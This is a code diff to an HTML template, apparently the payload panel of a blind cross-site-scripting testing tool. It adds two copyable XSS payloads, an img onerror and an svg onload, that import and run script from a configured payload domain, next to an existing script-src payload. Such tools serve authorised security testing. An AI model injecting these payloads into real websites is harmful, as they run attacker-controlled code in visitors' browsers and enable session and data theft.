@@ -26,6 +26,14 @@
                         <div class="panel-heading">Payloads</div>
                         <div class="panel-body">
                             <div class="form-group">
+                                <label class="control-label">Img src onerror</label>
+                                <input class="form-control" disabled
+                                       value='<img/src/onerror=import('//{{setting[payload-domain]}}')>'><br>
+                                
+                                <label class="control-label">SVG onload</label>
+                                <input class="form-control" disabled
+                                       value='<svg/onload=import('//{{setting[payload-domain]}}')>'><br>
+                                
                                 <label class="control-label">Script src</label>
                                 <input class="form-control" disabled
                                        value='<script src=//{{setting[payload-domain]}}></script>'><br>
